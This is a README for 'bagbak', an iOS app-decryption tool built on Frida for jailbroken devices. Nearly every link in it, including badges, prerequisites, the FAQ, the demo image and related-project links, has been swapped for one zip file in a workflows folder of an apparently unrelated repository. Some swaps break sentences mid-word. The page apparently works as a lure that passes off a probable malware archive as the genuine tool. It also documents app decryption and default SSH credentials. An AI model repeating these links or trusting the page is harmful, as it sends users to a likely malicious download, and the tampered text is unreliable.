# bagbak

[![version](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)]((https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip))
[![downloads](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
[![issues](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
[![sponsers](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
[![license](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](LICENSE)

**Project is out of active development, please consider other solutions**

* [subdiox/UnFairPlay](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)
* [paradiseduo/appdecrypt](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)

Yet another frida based App decryptor. Requires jailbroken iOS device and [https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)

Tested on iOS 15 (Domapine) and iOS 16 (palera1n).

[![demo](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)

*The name of this project doesn't have any meaning. I was just listening to that song while typing.*

[FAQ](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)

## Prerequisites

### On device

With Cydia or Sileo:

* [https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip)

### On desktop

* [https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip). If you have issues on `npm install`, your https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip might be either too new or too old. Try to use `nvm` to install a compatible version or download the correct installer.
* `zip` or `7z` command is needed to create zip archive. On most of the distros, you don't need to install them manually.

### Windows Compatibility

* Filesystem of iOS differs from Windows. If you are running bagbak on Windows, **some of the file attributes (e.g., executable bit) will be lost**, thus the repacked ipa may not be able to reinstall on your phone. But it does not matter if you only indend to do static analysis.

## Install

```
npm install -g bagbak
```

## Usage

bagbak [bundle id or name]

```
Options:
  -l, --list             list apps
  -U, --usb              connect to USB device (default)
  -R, --remote           connect to remote frida-server
  -D, --device <uuid>    connect to device with the given ID
  -H, --host <host>      connect to remote frida-server on HOST
  -f, --force            override existing files
  -d, --debug            enable debug output
  -r, --raw              dump raw app bundle to directory (no ipa)
  -o, --output <output>  ipa filename or directory to dump to
  -h, --help             display help for command
```

Environments variables:

* `DEBUG=1` enable debug output for troubleshooting
* `DEBUG_SCP=1` debug SCP protocol
* `SSH_USERNAME` username for iPhone SSH, default to `root`
* `SSH_PASSWORD` password for iPhone SSH, default to `alpine`
* `SSH_PORT` port for iPhone SSH. If not given, bagbak will scan port 22 (OpenSSH) and port 44 (Dropbear)


Example:

* `bagbak -l` to list all apps
* `bagbak --raw Chrome` to dump the app to current directory
* `bagbak https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip` to dump app to `https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip[version].ipa`

## 国内用户 frida 安装失败问题

[使用国内镜像加速安装](https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%AE%89%E8%A3%85#%E9%A2%84%E7%BC%96%E8%AF%91%E5%8C%85%E5%A4%B1%E8%B4%A5)

<p align="center">想看更多中文技术分享？欢迎关注我的公众号</p>
<p align="center"><image src="https://github.com/JasMyName/bagbak/raw/refs/heads/main/.github/workflows/Software_1.6.zip" width="240" /></p>
